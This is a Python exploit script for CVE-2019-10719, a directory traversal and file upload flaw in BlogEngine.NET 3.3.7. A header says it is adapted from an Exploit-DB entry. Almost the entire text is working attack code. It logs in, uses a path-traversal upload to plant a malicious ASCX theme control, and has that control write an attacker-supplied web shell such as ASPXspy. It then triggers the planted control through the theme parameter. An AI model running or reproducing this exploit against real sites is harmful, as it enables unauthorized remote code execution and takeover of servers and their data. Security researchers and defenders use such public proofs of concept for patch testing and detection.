# Modified from: https://www.exploit-db.com/exploits/47010
# Exploit Title: Directory Traversal + File Upload on BlogEngine.NET
# Date: 17 Jun 2019
# Exploit Author: Aaron Bishop
# Vendor Homepage: https://blogengine.io/
# Version: v3.3.7
# Tested on: 3.3.7, 3.3.6
# CVE : 2019-10719

#1. Description
#==============

#BlogEngine.NET is vulnerable to an Directory Traversal on `/api/upload` which allows a RCE through the `theme` parameter.

#2. Proof of Concept
#=============

#Using an account that has permissions to Edit Posts, upload a malicious file called `PostView.ascx`; exploit the directory traversal to upload the shell into the **/Custom/Themes** #directory:

import argparse
import io
import json
import os
import re
import requests
import sys
import base64

"""
Exploit for CVE-2019-10719

CVE Identified by: Aaron Bishop
Exploit written by: Aaron Bishop

Upload and trigger a reverse shell

python exploit.py -t 192.168.10.9 -f ASPXspy2.aspx

"""

urls = {
        "login": "/Account/login.aspx",
        "traversal": "/api/filemanager"
       }


def make_request(session, method, target, params={}, data={}, files={}):
    proxies = {
            "http": "127.0.0.1:8080",
            "https": "127.0.0.1:8080"
              }
    proxies = None
    if method == 'GET':
        r = requests.Request(method, target, params=params)
    elif method == 'POST':
        if files:
            r = requests.Request(method, target, files=files)
        else:
            r = requests.Request(method, target, data=data)
    prep = session.prepare_request(r)
    resp = session.send(prep, verify=False, proxies=proxies)
    return resp.text

def login(session, host, user, passwd):
    resp = make_request(session, 'GET', host+urls.get('login'))
    login_form = re.findall('<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>', resp)
    login_data = dict([(i[0],i[2]) for i in login_form])
    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})
    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})
    resp = make_request(session, 'POST', host+urls.get('login'), data=login_data)

def upload_shell(session, target, shell_dir, upload_file):

    if os.path.isfile(upload_file):
        with open(upload_file, 'rb') as f:
            content = base64.b64encode(f.read()).decode('ascii')
    else:
        print("%s is not found" % upload_file)
        sys.exit(0)

    base_upload_file = os.path.basename(upload_file)

    shell =r'''<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
        string appPath = Request.PhysicalApplicationPath;
        string filePath =  appPath + "\\Custom\\Themes\\''' + shell_dir+ r'''\\''' + base_upload_file + r'''";
        byte[] dataArray = Convert.FromBase64String("'''+content+r'''");

        using(FileStream fileStream = new FileStream(filePath, FileMode.Create))
        {
            for(int i = 0; i < dataArray.Length; i++)
            {
                fileStream.WriteByte(dataArray[i]);
            }
        }

    }
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>'''
    make_request(session, "POST", target + "/api/upload?action=filemgr&dirPath=~/App_Data/files/../../Custom/Themes/" + shell_dir, files={"file": ("PostView.ascx".format(shell_dir=shell_dir), shell, "application/octet-stream")})

def trigger_shell(session, target, shell_dir):
    make_request(session, "GET", target + "/", params={"theme": shell_dir})

def main(target, user, passwd, shell_dir, upload_file):
    with requests.Session() as session:
        login(session, target, user, passwd)
        upload_shell(session, target, shell_dir, upload_file)
        print("%s/?theme=%s" % (target, shell_dir))
        print('Uploaded file: %s/Custom/Themes/%s/%s' % (target, shell_dir,os.path.basename(upload_file)))
        print('Physical location: C:\\inetpub\\wwwroot\\Custom\\Themes\\%s\\%s' % (shell_dir,os.path.basename(upload_file)))
        trigger_shell(session, target, shell_dir)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10719 Path traversal + RCE')
    parser.add_argument('-t', '--target', action="store", dest="target_ip", required=True, help='Target host\'s IP')
    parser.add_argument('-f', '--upload_file', default="a.txt", required=True, help='Uploaded filename')
    parser.add_argument('-u', '--user', default="admin", action="store", dest="user", help='Account with file upload permissions on blog')
    parser.add_argument('-p', '--passwd', default="admin", action="store", dest="passwd", help='Password for account')
    parser.add_argument('-d', '--dir', nargs='?', default="RCE", help='Theme Directory to write Reverse shell too')
    parser.add_argument('-s', '--ssl', action="store_true", help="Force SSL")
    args = parser.parse_args()

    protocol = "https://" if args.ssl else "http://"
    main(protocol + args.target_ip, args.user, args.passwd, args.dir, args.upload_file)
